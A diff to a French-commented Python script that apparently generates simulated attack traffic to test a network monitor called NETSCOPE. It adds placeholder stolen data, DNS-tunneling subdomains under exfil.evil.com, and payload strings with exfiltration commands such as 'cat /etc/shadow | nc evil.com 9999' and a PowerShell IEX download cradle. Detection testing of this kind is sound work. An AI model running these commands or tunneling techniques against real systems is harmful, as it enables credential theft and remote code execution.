@@ -74,6 +74,35 @@ SUSPECT_TERMS = [
     "mimikatz sekurlsa::logonpasswords",
 ]
 
+# Données exfiltrées par scénario (réaliste pour présentation)
+EXFIL_C2 = [
+    "EXFIL:user:admin password:S3cur3P@ss!",
+    "EXFIL:DB_HOST=prod-db.internal DB_PASS=r00tP@ssw0rd",
+    "EXFIL:AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+    "EXFIL:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ== admin@server",
+]
+
+EXFIL_DNS = [
+    "dXNlcjphZG1pbjpQQHNz.exfil.evil.com",       # base64(user:admin:P@ss)
+    "Y3JlZGl0XzQ1MzItMTIzNA.exfil.evil.com",     # base64(credit_4532-1234)
+    "c3NoX2tleV9wcml2YXRl.exfil.evil.com",        # base64(ssh_key_private)
+    "YXBpX3Rva2VuX2docF94eA.exfil.evil.com",      # base64(api_token_ghp_xx)
+]
+
+EXFIL_PORTS = [
+    "employee_ssn:123-45-6789 name:John.Doe salary:95000",
+    "credit_card:4532-1234-5678-9012 exp:12/27 cvv:321",
+    '{"api_token":"ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"}',
+    "BEGIN RSA PRIVATE KEY MIIEowIBAAKCAQEA7...fake...key",
+]
+
+EXFIL_TERMS = [
+    "cat /etc/shadow | nc evil.com 9999",
+    "mysqldump --all-databases | curl -X POST http://evil.com/dump",
+    "tar czf - /home | openssl enc -aes-256-cbc | nc evil.com 443",
+    "powershell IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')",
+]
+
 
 # ============================================================
 # Utilitaires
@@ -128,20 +157,26 @@ def pause(seconds: float, label: str = ""):
 def scenario_1_blacklist_ip():
     banner("SCÉNARIO 1 — Connexion vers IPs C2 blacklistées")
     print("  Déclenche: anomalie IP blacklistée (score base 85 + bonus)")
+    print("  Exfiltration: données sensibles envoyées vers C2 via TCP")
     print()
 
-    for ip in BLACKLISTED_IPS:
-        step(f"Tentative connexion TCP → {ip}:443")
+    for i, ip in enumerate(BLACKLISTED_IPS):
+        step(f"Connexion TCP → {ip}:443 + exfiltration données")
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(2)
             s.connect_ex((ip, 443))
+            if i < len(EXFIL_C2):
+                try:
+                    s.sendall(EXFIL_C2[i].encode())
+                except Exception:
+                    pass
             s.close()
         except Exception:
             pass
         pause(0.5)
 
-    step("Connexions C2 simulées — paquets visibles par NETSCOPE")
+    step("Connexions C2 + exfiltration simulées — paquets visibles par NETSCOPE")
 
 
 # ============================================================
@@ -151,6 +186,7 @@ def scenario_1_blacklist_ip():
 def scenario_2_phishing_domains():
     banner("SCÉNARIO 2 — Requêtes DNS vers domaines phishing/malware")
     print("  Déclenche: anomalie domaine blacklisté (score base 80)")
+    print("  Exfiltration: DNS tunneling — données encodées dans les sous-domaines")
     print()
 
     all_domains = PHISHING_DOMAINS + MALWARE_DOMAINS
@@ -163,16 +199,25 @@ def scenario_2_phishing_domains():
             pass
         pause(0.3)
 
+    step("Exfiltration DNS tunneling — données dans sous-domaines")
     if HAS_SCAPY:
-        step("Envoi requêtes DNS via Scapy pour visibilité maximale")
-        for domain in all_domains[:3]:
+        for exfil_domain in EXFIL_DNS:
+            step(f"DNS query → {exfil_domain[:50]}")
             try:
-                pkt = IP(dst="8.8.8.8") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=domain))
+                pkt = IP(dst="8.8.8.8") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=exfil_domain))
                 sr1(pkt, timeout=2, verbose=0)
             except Exception:
                 pass
+            pause(0.3)
+    else:
+        for exfil_domain in EXFIL_DNS:
+            step(f"nslookup {exfil_domain[:50]}")
+            try:
+                socket.getaddrinfo(exfil_domain, 80, socket.AF_INET, socket.SOCK_STREAM)
+            except socket.gaierror:
+                pass
 
-    step("Requêtes DNS phishing/malware envoyées")
+    step("Requêtes DNS phishing/malware + exfiltration envoyées")
 
 
 # ============================================================
@@ -182,29 +227,36 @@ def scenario_2_phishing_domains():
 def scenario_3_suspicious_ports():
     banner("SCÉNARIO 3 — Connexions sur ports suspects")
     print("  Déclenche: bonus port suspect (+15 au score anomalie)")
+    print("  Exfiltration: données sensibles envoyées via ports non-standard")
     print()
 
-    for port in SUSPICIOUS_PORTS:
+    for i, port in enumerate(SUSPICIOUS_PORTS):
         step(f"Connexion TCP → {GATEWAY_IP}:{port}")
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(1)
             s.connect_ex((GATEWAY_IP, port))
+            if i < len(EXFIL_PORTS):
+                try:
+                    s.sendall(EXFIL_PORTS[i].encode())
+                except Exception:
+                    pass
             s.close()
         except Exception:
             pass
         pause(0.3)
 
     if HAS_SCAPY:
-        step("Scan SYN Scapy sur ports suspects")
-        for port in SUSPICIOUS_PORTS[:4]:
+        step("Exfiltration Scapy sur ports suspects")
+        for i, port in enumerate(SUSPICIOUS_PORTS[:4]):
+            payload = EXFIL_PORTS[i % len(EXFIL_PORTS)].encode()
             try:
-                pkt = IP(dst=GATEWAY_IP) / TCP(dport=port, flags="S")
+                pkt = IP(dst=GATEWAY_IP) / TCP(dport=port, flags="PA") / payload
                 send(pkt, verbose=0)
             except Exception:
                 pass
 
-    step("Trafic ports suspects généré")
+    step("Trafic ports suspects + exfiltration généré")
 
 
 # ============================================================
@@ -270,14 +322,16 @@ def scenario_4_icmp_exfil():
 def scenario_5_suspect_terms():
     banner("SCÉNARIO 5 — Payload avec termes suspects")
     print("  Déclenche: anomalie terme suspect (score base 65)")
-    print("  ⚠️  Nécessite Scapy + capture niveau 2+ sur NETSCOPE")
+    print("  Exfiltration: commandes d'exfiltration dans les payloads")
     print()
+
+    all_payloads = SUSPECT_TERMS + EXFIL_TERMS
 
     if not HAS_SCAPY:
         step("Scapy non disponible — fallback HTTP")
         if HAS_REQUESTS:
-            for term in SUSPECT_TERMS[:3]:
-                step(f"Envoi payload HTTP contenant: {term[:40]}...")
+            for term in all_payloads:
+                step(f"Envoi payload HTTP: {term[:45]}...")
                 try:
                     requests.post(
                         f"http://{GATEWAY_IP}/",
@@ -290,8 +344,8 @@ def scenario_5_suspect_terms():
             step("Ni Scapy ni requests disponible — scénario ignoré")
         return
 
-    for term in SUSPECT_TERMS:
-        step(f"Envoi UDP payload: {term[:40]}...")
+    for term in all_payloads:
+        step(f"Envoi UDP payload: {term[:45]}...")
         try:
             pkt = IP(dst=GATEWAY_IP) / UDP(dport=9999) / term.encode()
             send(pkt, verbose=0)
@@ -299,7 +353,7 @@ def scenario_5_suspect_terms():
             pass
         pause(0.2)
 
-    step("Payloads suspects envoyés")
+    step("Payloads suspects + commandes exfiltration envoyés")
 
 
 # ============================================================
@@ -309,39 +363,58 @@ def scenario_5_suspect_terms():
 def scenario_6_combined():
     banner("SCÉNARIO 6 — Attaque combinée (multiplicateur 1.2x)")
     print("  Déclenche: IP blacklistée + port suspect + volume = score maximum")
+    print("  Exfiltration: multi-canal (TCP C2 + ICMP + UDP)")
     print()
 
+    all_exfil = EXFIL_C2 + EXFIL_PORTS
+
     if HAS_SCAPY:
-        step("Envoi rafale combinée via Scapy")
+        step("Rafale C2 + exfiltration TCP vers IP blacklistée")
         for i in range(50):
+            payload = all_exfil[i % len(all_exfil)].encode()
             try:
-                pkt = IP(dst=BLACKLISTED_IPS[0]) / TCP(dport=4444, flags="S")
+                pkt = IP(dst=BLACKLISTED_IPS[0]) / TCP(dport=4444, flags="PA") / payload
                 send(pkt, verbose=0)
             except Exception:
                 pass
 
+        step("Rafale C2 + exfiltration vers second C2")
         for i in range(50):
+            payload = all_exfil[i % len(all_exfil)].encode()
             try:
-                pkt = IP(dst=BLACKLISTED_IPS[1]) / TCP(dport=31337, flags="S")
+                pkt = IP(dst=BLACKLISTED_IPS[1]) / TCP(dport=31337, flags="PA") / payload
                 send(pkt, verbose=0)
             except Exception:
                 pass
 
-        step("100 paquets combinés envoyés (C2 + ports suspects)")
+        step("Exfiltration ICMP en parallèle")
+        for i, data in enumerate(EXFIL_C2):
+            try:
+                pkt = IP(dst=GATEWAY_IP) / ICMP(type=8, id=0xBEEF, seq=i) / data.encode()
+                send(pkt, verbose=0)
+            except Exception:
+                pass
+
+        step("100+ paquets combinés envoyés (C2 + ports suspects + exfil multi-canal)")
     else:
-        step("Fallback socket — connexions multiples")
-        for _ in range(30):
+        step("Fallback socket — connexions multiples + exfiltration")
+        for j in range(30):
             for ip in BLACKLISTED_IPS[:2]:
                 for port in [4444, 31337, 6666]:
                     try:
                         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                         s.settimeout(0.5)
                         s.connect_ex((ip, port))
+                        if j < len(all_exfil):
+                            try:
+                                s.sendall(all_exfil[j % len(all_exfil)].encode())
+                            except Exception:
+                                pass
                         s.close()
                     except Exception:
                         pass
 
-    step("Attaque combinée terminée — score santé devrait être critique")
+    step("Attaque combinée + exfiltration terminée — score santé critique")
 
 
 # ============================================================
